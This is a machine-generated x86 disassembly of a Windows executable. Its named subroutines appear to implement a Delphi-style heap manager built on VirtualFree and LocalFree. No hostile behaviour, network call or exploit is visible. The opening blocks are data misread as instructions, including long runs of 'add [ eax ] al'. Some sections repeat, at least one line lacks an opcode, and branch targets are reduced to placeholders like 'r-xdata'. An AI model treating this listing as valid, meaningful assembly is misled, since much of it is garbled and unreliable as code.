sub_401092
call [ eax + r-xdata ]
add al 0x6
inc esp
outsd
jne r-xdata
push 0x65
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 8 + 0x10 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
insb
add [ gs : ebp + 0x10a80040 ] ecx
inc eax
add [ edx ] cl
push es
push ebx
je r-xdata
add [ eax ] al
je r-xdata
imul ebp [ esi + 0x67 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
adc [ eax ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor eax [ eax ]
mov ah 0x56
inc eax
add al al
push esi
inc eax
add ah dh
xor eax [ eax ]
call 0xffffffffd0405218
push esi
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x11004031 ] cl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
push ebx
jns r-xdata
cld
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
inc eax
add ah ch
xor eax [ eax ]
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
inc edi
add [ ebx - 0x6fda0040 ] cl
loope r-xdata
xchg esp eax
loope r-xdata
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
inc edi
add [ ebx + 0x6c25ffc0 ] cl
loope r-xdata
inc edi
add [ ebx - 0x73da0040 ] cl
loope r-xdata
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
retn
add [ ebx + 0x5c25ffc0 ] cl
loope sub_401350
inc edi
add [ ebx - 0x23da0040 ] cl
loope r-xdata
inc edi
add [ ebx - 0x77da0040 ] cl
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ ebx + 0x5825ffc0 ] cl
loope LocalFree
inc edi
add [ ebx - 0x27da0040 ] cl
loope r-xdata
inc edi
add [ ebx - 0x7bda0040 ] cl
loope r-xdata
add [ ebx + 0x5425ffc0 ] cl
loope sub_401360
inc edi
add [ ebx - 0x2bda0040 ] cl
loope r-xdata
inc edi
add [ ebx - 0x7fda0040 ] cl
loope r-xdata
add [ ebx + 0x5025ffc0 ] cl
loope VirtualFree
inc edi
add [ ebx + 0x6825ffc0 ] cl
loope r-xdata
inc edi
add [ ebx + 0x7c25ffc0 ] cl
loope r-xdata
add [ ebx + 0x4c25ffc0 ] cl
loope sub_401370
inc edi
add [ ebx + 0x6425ffc0 ] cl
loope r-xdata
inc edi
add [ ebx + 0x7825ffc0 ] cl
loope r-xdata
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x49 ] dl
inc edi
add [ ebx - 0x13da0040 ] cl
loope r-xdata
inc edi
add [ ebx - 0x3bda0040 ] cl
loope r-xdata
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
add [ ebx - 0x17da0040 ] cl
loope r-xdata
inc edi
add [ ebx + 0x7425ffc0 ] cl
loope r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
add [ ebx - 0x1bda0040 ] cl
loope r-xdata
inc edi
add [ ebx + 0x7025ffc0 ] cl
loope r-xdata
je r-xdata
add [ ebx + 0x6025ffc0 ] cl
loope r-xdata
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40324c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor eax [ eax ]
mov ah 0x56
inc eax
add al al
push esi
inc eax
add ah dh
xor eax [ eax ]
call 0xffffffffd0405218
push esi
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x11004031 ] cl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
inc edi
add [ ebx - 0x6fda0040 ] cl
loope r-xdata
xchg esp eax
loope r-xdata
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
inc edi
add [ ebx + 0x6c25ffc0 ] cl
loope r-xdata
inc edi
add [ ebx - 0x73da0040 ] cl
loope r-xdata
retn
add [ ebx + 0x5c25ffc0 ] cl
loope sub_401350
inc edi
add [ ebx - 0x23da0040 ] cl
loope r-xdata
inc edi
add [ ebx - 0x77da0040 ] cl
loope r-xdata
add [ ebx + 0x5825ffc0 ] cl
loope LocalFree
inc edi
add [ ebx - 0x27da0040 ] cl
loope r-xdata
inc edi
add [ ebx - 0x7bda0040 ] cl
loope r-xdata
add [ ebx + 0x5425ffc0 ] cl
loope sub_401360
inc edi
add [ ebx - 0x2bda0040 ] cl
loope r-xdata
inc edi
add [ ebx - 0x7fda0040 ] cl
loope r-xdata
add [ ebx + 0x5025ffc0 ] cl
loope VirtualFree
inc edi
add [ ebx + 0x6825ffc0 ] cl
loope r-xdata
inc edi
add [ ebx + 0x7c25ffc0 ] cl
loope r-xdata
add [ ebx + 0x4c25ffc0 ] cl
loope sub_401370
inc edi
add [ ebx + 0x6425ffc0 ] cl
loope r-xdata
inc edi
add [ ebx + 0x7825ffc0 ] cl
loope r-xdata
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x49 ] dl
inc edi
add [ ebx - 0x13da0040 ] cl
loope r-xdata
inc edi
add [ ebx - 0x3bda0040 ] cl
loope r-xdata
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
add [ ebx - 0x17da0040 ] cl
loope r-xdata
inc edi
add [ ebx + 0x7425ffc0 ] cl
loope r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
add [ ebx - 0x1bda0040 ] cl
loope r-xdata
inc edi
add [ ebx + 0x7025ffc0 ] cl
loope r-xdata
je r-xdata
add [ ebx + 0x6025ffc0 ] cl
loope r-xdata
sub_401390
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401350
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013e8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401390
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401430
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401418
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401418
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013e8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013e8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401418
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401534
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013e8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401360
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401598
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401360
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401360
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013e8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401610
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401418
mov [ rw-data ] 0x1
sub_4016c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401360
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40175c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401534
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016c8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401430
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401610
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401418
jmp r-xdata
sub_40186c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401598
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401430
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401598
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401610
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401430
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016c8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401610
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401418
jmp r-xdata
sub_401990
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40175c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401430
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401610
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014a0
jmp r-xdata
sub_401a1c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ad2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401370
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
push 0xff8
push 0x0
call sub_401350
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401378
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ad9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401380
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ae0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bb6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401378
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401388
retn
push rw-data
call sub_401380
sub_401bc0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c24
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c54
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e28
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401ca8
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c84
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cd0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bc0
add ebx esi
mov [ rw-data ] 0x6
sub_401d40
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bc0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c24
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401990
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401990
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c54
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014a0
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401ca8
sub_401e28
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d78
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401eb0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c84
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401efc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401eb0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401430
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cd0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d40
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c54
sub [ edi + 0x4 ] 0x4
sub_401f88
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017dc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401efc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fb4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40186c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401efc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fe8
xor edx edx
test eax eax
jns r-xdata
